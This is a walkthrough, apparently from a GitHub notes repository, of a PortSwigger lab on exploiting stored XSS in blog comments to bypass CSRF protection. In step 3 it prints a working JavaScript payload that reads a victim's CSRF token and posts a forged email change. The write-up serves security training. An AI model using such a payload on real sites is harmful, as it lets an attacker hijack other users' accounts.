# XSS - Exploiting XSS to bypass CSRF defenses

## 📌 Lab Details
- **Title**: Exploiting XSS to bypass CSRF defenses
- **Difficulty**: Practitioner
- **Category**: Cross-site Scripting
- **Lab URL**: https://portswigger.net/academy/labs/launch/49e763496c6cdc049d3bc1855b2cf77f952d4f6c5793794e98ec2c06ca2fc193?referrer=%2fweb-security%2fcross-site-scripting%2fexploiting%2flab-perform-csrf

## 🔍 Summary
This lab contains a **stored XSS** vulnerability in blog comments. The goal is to use XSS to steal a **CSRF token** from a victim's account page and send a **forged POST request** to change the victim's email address.

## 🛠 Steps to Solve
1. Log in using the credentials provided. Notice the function for updating your email address.
2. View the source of the page to notice:
   - A **POST** request to `/my-account/change-email`, with a parameter called `email`.
   - There's an anti-CSRF token in a hidden input called `token`.
3. Inject the payload into the blog comments section:
   ```sh
   <script>
   var req=new XMLHttpRequest();
   req.onload=handleResponse;
   req.open('get','/my-account',true);
   req.send();
   function handleResponse() {
     var token=this.responseText.match(/name="csrf" value="(\w+)"/) [1];
     var changeReq=new XMLHttpRequest();
     changeReq.open('post','/my-account/change-email',true);
     changeReq.send('csrf='+token+'&email=test@test.com')
   };
   </script>
   ```
   This will make anyone who views the comment issue a POST request to change their email address to `test@test.com`.

## 📖 Key Takeaways
- **Stored XSS** is used to persist a malicious script in a comment.
- Demonstrates how XSS can bypass CSRF protection by programmatically grabbing the token.
  
## 🖼️ Screenshot 
![image](https://github.com/user-attachments/assets/54fd4947-25f0-4465-aecd-f929c5285ce0)
![image](https://github.com/user-attachments/assets/b290eafb-3270-4612-8db9-28d66991cf0c)
![image](https://github.com/user-attachments/assets/395ab9c1-241e-4bb2-bc51-f136d83c46bd)
![image](https://github.com/user-attachments/assets/6a9ef73e-99d0-4b0e-810f-2286e8728ecc)
![image](https://github.com/user-attachments/assets/1b86bcce-c578-4d97-b422-6c00f31fd173)

